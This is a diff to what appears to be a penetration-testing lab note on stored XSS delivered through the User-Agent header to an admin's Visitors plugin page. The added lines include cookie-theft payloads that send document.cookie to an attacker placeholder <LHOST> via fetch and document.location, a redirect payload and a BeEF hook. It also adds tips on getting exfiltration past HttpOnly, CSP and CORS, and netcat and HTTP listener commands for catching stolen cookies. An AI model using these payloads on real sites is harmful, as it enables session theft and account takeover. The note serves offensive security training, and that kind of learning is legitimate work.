@@ -16,6 +16,9 @@ tags:
 > | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
 > | Attribute inject | `" onmouseover="alert(1)` |
 > | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |
+> | Cookie steal (fetch) | `<script>fetch('http://<LHOST>/?c='+document.cookie)</script>` |
+> | Redirect victim | `<script>window.location='http://<LHOST>'</script>` |
+> | BeEF hook | `<script src="http://<LHOST>:3000/hook.js"></script>` |
 
 ## Decision Tree
 
@@ -61,7 +64,24 @@ flowchart TD
 > - No pop-up when the admin loads the plugin → the payload may have been HTML-encoded or stripped; inspect the stored value in the response and adjust the context. See [[🔣 Encoding Reference]].
 > - You inject the payload but never see it fire → here the bug is **stored**, so the alert only triggers when the *admin* loads the Visitors plugin page, not when you send the request.
 > - Note: once wrapped in `<script>` tags, the User-Agent string itself won't render as visible text in the table — that is expected; the browser executes it instead of displaying it.
+> - Cookie-steal payload fires but you never see the cookie value → check DevTools **Storage → Cookies** for the `HttpOnly` flag; if set, JavaScript cannot read it at all. See [[Privilege Escalation via XSS]] for the pivot to an action-based payload.
+> - `alert()` never pops, and the response headers show `Content-Security-Policy: script-src 'self'` → CSP is blocking inline `<script>` execution (and can block your exfil `fetch`/beacon too); look for an allowed CDN, a JS file upload, or an `unsafe-inline` gap as a bypass.
+> - Your exfil `fetch()` throws a CORS error in the browser console → don't assume it failed. A simple cross-origin `fetch()`/`<img src=...>` beacon still *sends* the request even if the browser blocks you from reading the response — check your listener before troubleshooting further.
 > Full list: [[⚠️ Common Errors & Troubleshooting]]
+
+> [!warning] Nothing arrives at your listener
+> Cookie-theft and beacon payloads (`fetch`, `document.location`, `<img src=http://<LHOST>/...>`) only work if something is actually listening on the `<LHOST>` port *before* the victim's browser fires the request:
+> ```bash
+> python3 -m http.server 80
+> # or, to see the full raw request (headers, cookie value):
+> sudo nc -nvlp 80
+> ```
+> If you get `OSError: [Errno 98] Address already in use`, something else already owns port 80 — find and kill it:
+> ```bash
+> sudo lsof -i :80
+> sudo kill <PID>
+> ```
+> See [[⚠️ Common Errors & Troubleshooting]] for the full writeup.
 
 > [!tip] Beginner note
 > An `alert(42)` box proves nothing useful by itself — it is just the quickest visual proof that *your* JavaScript ran. Once confirmed, you replace the harmless alert with real attack code (like creating a new administrator), which is covered in [[Privilege Escalation via XSS]].
